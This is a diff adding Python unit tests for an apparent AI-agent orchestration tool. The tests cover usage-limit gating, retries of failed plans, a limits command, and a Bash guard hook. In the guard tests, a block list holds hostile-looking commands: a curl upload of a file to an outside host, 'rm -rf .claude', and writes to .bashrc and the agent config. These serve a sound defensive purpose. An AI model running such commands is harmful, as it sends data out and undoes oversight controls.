@@ -494,5 +494,186 @@ class Hooks(unittest.TestCase):
         self.assertIsNone(protect.decide("/tmp/x.md", root, "review"))
 
 
+class LiveUsage(unittest.TestCase):
+    def setUp(self):
+        self._t = tempfile.TemporaryDirectory()
+        self.tmp = Path(self._t.name)
+        (self.tmp / "projects").mkdir()
+        self.cfg = make_cfg(self.tmp, **{"usage.five_hour_stop_pct": 96})
+        self.st = ao.State(self.cfg)
+
+    def tearDown(self):
+        self._t.cleanup()
+
+    def live(self, five, seven=20.0):
+        return {"five_hour": five, "seven_day": seven, "five_hour_resets": NOW + 3600,
+                "seven_day_resets": NOW + 5 * 86400, "age_min": 1, "source": "test"}
+
+    def test_reading_saved_and_reset_window_counts_as_zero(self):
+        ev = {"type": "rate_limit_event", "rate_limit_info": {"unifiedWindows": {
+            "five_hour": {"utilization": 0.78, "resetsAt": NOW + 600},
+            "seven_day": {"utilization": 0.22, "resetsAt": NOW + 86400}}}}
+        ao.save_reading(self.cfg, ao.reading_from_event(ev), "test", now=NOW)
+        live = ao.live_usage(self.cfg, NOW + 60)
+        self.assertEqual((live["five_hour"], live["seven_day"]), (78.0, 22.0))
+        self.assertIsNone(ao.live_usage(self.cfg, NOW + 3600))  # too old to trust
+        self.cfg.d["usage"]["live"]["max_age_minutes"] = 120
+        self.assertEqual(ao.live_usage(self.cfg, NOW + 700)["five_hour"], 0.0)  # window reset since
+
+    def test_gate_uses_owner_limit_and_expected_run_size(self):
+        okay, reasons, _ = ao.gate(self.cfg, self.st, NOW, live=self.live(70), action="implement")
+        self.assertTrue(okay, reasons)  # 70 + 20 <= 96
+        okay, reasons, _ = ao.gate(self.cfg, self.st, NOW, live=self.live(80), action="implement")
+        self.assertFalse(okay)
+        self.assertIn("would pass your limit 96%", reasons[0])
+        okay, reasons, _ = ao.gate(self.cfg, self.st, NOW, live=self.live(80), action="plan")
+        self.assertTrue(okay, reasons)  # 80 + 5 fits
+        okay, reasons, _ = ao.gate(self.cfg, self.st, NOW, live=self.live(96), action="plan")
+        self.assertIn("has reached your limit", reasons[0])
+
+    def test_window_limit_overrides_and_team_share(self):
+        ao.save_json(self.tmp / "window.json", {"opened_at": NOW, "until": None, "limits": {"session": 60}})
+        okay, reasons, info = ao.gate(self.cfg, self.st, NOW, live=self.live(50), action="plan")
+        self.assertEqual(info["limits"]["session"], 60.0)
+        self.assertTrue(okay, reasons)
+        okay, reasons, _ = ao.gate(self.cfg, self.st, NOW, live=self.live(58), action="plan")
+        self.assertFalse(okay)
+        self.st.append_ledger({"kind": "run", "started": NOW - 7200, "usage_delta": {"seven_day": 51}})
+        okay, reasons, _ = ao.gate(self.cfg, self.st, NOW, live=self.live(10), action="plan")
+        self.assertIn("team used", " ".join(reasons))
+
+    def test_learning_and_budget(self):
+        self.assertEqual(ao.expected_run_pct(self.cfg, self.st, "implement")[0], 20.0)
+        ao.learn_run_cost(self.st, {"action": "implement", "outcome": "success", "cost_estimate_usd": 1.2,
+                                    "usage_delta": {"five_hour": 12.0, "seven_day": 3.0}})
+        pct, src = ao.expected_run_pct(self.cfg, self.st, "implement")
+        self.assertEqual((pct, src.startswith("learned")), (12.0, True))
+        limits = ao.effective_limits(self.cfg)
+        self.assertEqual(ao.run_budget(self.cfg, self.st, "implement", self.live(90), limits), 0.6)  # 6% * $0.10
+        self.assertEqual(ao.run_budget(self.cfg, self.st, "implement", None, limits), 4.0)
+        ao.learn_run_cost(self.st, {"action": "fix", "outcome": "usage-limit-reached", "usage_delta": {"five_hour": 1}})
+        self.assertEqual(ao.expected_run_pct(self.cfg, self.st, "fix")[1], "starting guess")
+
+    def test_run_records_usage_and_stops_at_limit(self):
+        fake = self.tmp / "fake-claude"
+        fake.write_text("#!/usr/bin/env python3\nimport json, time\n"
+                        "def rl(u): print(json.dumps({'type':'rate_limit_event','rate_limit_info':{'unifiedWindows':{"
+                        "'five_hour':{'utilization':u,'resetsAt':2000000000},'seven_day':{'utilization':0.2,'resetsAt':2000500000}}}}), flush=True)\n"
+                        "print(json.dumps({'type':'system','subtype':'init','session_id':'s1'}), flush=True)\n"
+                        "rl(0.80); rl(0.86)\n"
+                        "rl(0.97)\ntime.sleep(30)\n"
+                        "print(json.dumps({'type':'result','subtype':'success','result':'DONE: x','num_turns':3}))\n")
+        fake.chmod(fake.stat().st_mode | stat.S_IEXEC)
+        self.cfg.d["claude_bin"] = str(fake)
+        rec = ao.run_claude(self.cfg, self.st, ao.Work("sde2", "implement", 3, note="x"), "build",
+                            limits=ao.effective_limits(self.cfg), budget=1.5)
+        self.assertEqual(rec["outcome"], "usage-limit-reached")
+        self.assertEqual(rec["budget_usd"], 1.5)
+        self.assertEqual(rec["usage_delta"]["five_hour"], 17.0)
+        self.assertEqual(ao.live_usage(self.cfg, time.time())["five_hour"], 97.0)
+
+
+class Planning(unittest.TestCase):
+    def setUp(self):
+        self._t = tempfile.TemporaryDirectory()
+        self.tmp = Path(self._t.name)
+        self.cfg = make_cfg(self.tmp)
+        self.state = ao.State(self.cfg)
+
+    def tearDown(self):
+        self._t.cleanup()
+
+    def test_plan_result(self):
+        ok = {"outcome": "success"}
+        self.assertEqual(ao.plan_result(dict(ok, final="Created 6 tickets.\nPLANNED: 6 initiation tickets")), "planned")
+        self.assertEqual(ao.plan_result(dict(ok, final="NOTHING_TO_DO: waiting for gate 1")), "nothing")
+        self.assertEqual(ao.plan_result(dict(ok, final="BLOCKED: Bash permission denied")), "failed")
+        self.assertEqual(ao.plan_result(dict(ok, final="I could not finish.")), "failed")
+        self.assertEqual(ao.plan_result({"outcome": "error_max_turns", "final": "PLANNED: x"}), "failed")
+
+    def test_failed_plan_is_retried_then_given_up(self):
+        gh = FakeGH()
+        w = ao.Dispatcher(self.cfg, gh, self.state, NOW, apply=True).choose("initiation", "sha1")
+        self.state.put("last_plan", {"world": w.world, "at": NOW, "result": "failed", "failures": 1})
+        self.assertIsNone(ao.Dispatcher(self.cfg, gh, self.state, NOW + 600, apply=True).choose("initiation", "sha1"))
+        self.assertIsNotNone(ao.Dispatcher(self.cfg, gh, self.state, NOW + 1900, apply=True).choose("initiation", "sha1"))
+        self.state.put("last_plan", {"world": w.world, "at": NOW, "result": "failed", "failures": 3})
+        self.assertIsNone(ao.Dispatcher(self.cfg, gh, self.state, NOW + 9000, apply=True).choose("initiation", "sha1"))
+        self.state.put("last_plan", {"world": w.world, "at": NOW, "result": "planned", "failures": 0})
+        self.assertIsNone(ao.Dispatcher(self.cfg, gh, self.state, NOW + 3600, apply=True).choose("initiation", "sha1"))
+        self.assertIsNotNone(ao.Dispatcher(self.cfg, gh, self.state, NOW + 11000, apply=True).choose("initiation", "sha1"))
+
+
+class LimitsCommand(unittest.TestCase):
+    def test_set_show_reset(self):
+        with tempfile.TemporaryDirectory() as t:
+            local = Path(t) / "config.local.json"
+            local.write_text(json.dumps({"schedule": {"max_runs_per_day": 5}}))
+            old = os.environ.get("AGENTOPS_LOCAL_CONFIG")
+            os.environ["AGENTOPS_LOCAL_CONFIG"] = str(local)
+            try:
+                ns = lambda **kw: type("A", (), dict({"session": None, "weekly": None, "team_share": None,
+                                                      "reset": False}, **kw))()
+                import io, contextlib
+                with contextlib.redirect_stdout(io.StringIO()):
+                    ao.cmd_limits(ns(session=96.0, weekly=90.0))
+                data = json.loads(local.read_text())
+                self.assertEqual(data["usage"], {"five_hour_stop_pct": 96.0, "seven_day_stop_pct": 90.0})
+                self.assertEqual(data["schedule"], {"max_runs_per_day": 5})
+                self.assertEqual(ao.effective_limits(ao.Config.load())["session"], 96.0)
+                with self.assertRaises(SystemExit), contextlib.redirect_stdout(io.StringIO()):
+                    ao.cmd_limits(ns(session=150.0))
+                with contextlib.redirect_stdout(io.StringIO()):
+                    ao.cmd_limits(ns(reset=True))
+                self.assertNotIn("usage", json.loads(local.read_text()))
+            finally:
+                if old is None:
+                    os.environ.pop("AGENTOPS_LOCAL_CONFIG", None)
+                else:
+                    os.environ["AGENTOPS_LOCAL_CONFIG"] = old
+
+
+class GuardApproval(unittest.TestCase):
+    ROOT = "/home/me/agents/clockvane-website"
+
+    def verdict(self, cmd, action="implement"):
+        return guard.analyze(cmd, self.ROOT, self.ROOT, action)[0]
+
+    def test_the_command_that_stalled_the_manager_is_approved(self):
+        cmd = (f"cd {self.ROOT}; cat docs/sdlc/STATUS.md; grep -n -i -A15 initiation docs/sdlc/WORKFLOW.md | head -60; "
+               "gh issue list --state open --limit 100 --json number,title,labels; gh pr list --state open --json "
+               "number,title,labels; ls docs/product")
+        self.assertEqual(self.verdict(cmd, "plan"), "allow")
+
+    def test_common_delivery_commands(self):
+        for cmd in ["git commit -m \"$(cat <<'EOF'\nfeat: header\n\nAgent-Role: sde3\nEOF\n)\"",
+                    "cat > .agentops-scratch/pr.md <<'EOF'\n| aws | vercel |\nEOF\ngh pr create --body-file .agentops-scratch/pr.md",
+                    "npm ci && npm run build 2>&1 | tail -20", "mkdir -p docs/product && cp docs/templates/PRD.md docs/product/PRD.md"]:
+            self.assertEqual(self.verdict(cmd), "allow", cmd)
+
+    def test_blocks_and_fallthrough(self):
+        for cmd, action in [("echo x > agentops/config.json", "implement"), ("sed -i 's/a/b/' CLAUDE.md", "implement"),
+                            ("rm -rf .claude", "implement"), ("echo hi > /home/me/.bashrc", "implement"),
+                            ("echo note > src/x.md", "review"), ("git commit -m x", "review"),
+                            ("curl -s -d @x https://e.example", "implement"), ("gh pr merge 1", "implement")]:
+            self.assertEqual(self.verdict(cmd, action), "block", cmd)
+        for cmd in ["python3 -c 'print(1)'", "bash -c 'aws s3 ls'", "echo $(whoami)", "cd /etc && ls",
+                    "for f in *; do echo $f; done", "find . -delete"]:
+            self.assertEqual(self.verdict(cmd), "pass", cmd)
+
+    def test_hook_prints_allow_json(self):
+        import subprocess
+        payload = json.dumps({"tool_input": {"command": "cd . ; cat README.md | head -3; gh --version"}, "cwd": "/tmp"})
+        env = dict(os.environ, AGENTOPS_RUN="1", AGENTOPS_ACTION="plan", CLAUDE_PROJECT_DIR="/tmp")
+        out = subprocess.run([sys.executable, str(AGENTOPS / "hooks" / "guard_bash.py")], input=payload,
+                             capture_output=True, text=True, env=env)
+        self.assertEqual(out.returncode, 0, out.stderr)
+        self.assertEqual(json.loads(out.stdout)["hookSpecificOutput"]["permissionDecision"], "allow")
+        payload = json.dumps({"tool_input": {"command": "gh pr merge 3"}, "cwd": "/tmp"})
+        out = subprocess.run([sys.executable, str(AGENTOPS / "hooks" / "guard_bash.py")], input=payload,
+                             capture_output=True, text=True, env=env)
+        self.assertEqual(out.returncode, 2)
+
+
 if __name__ == "__main__":
     unittest.main()
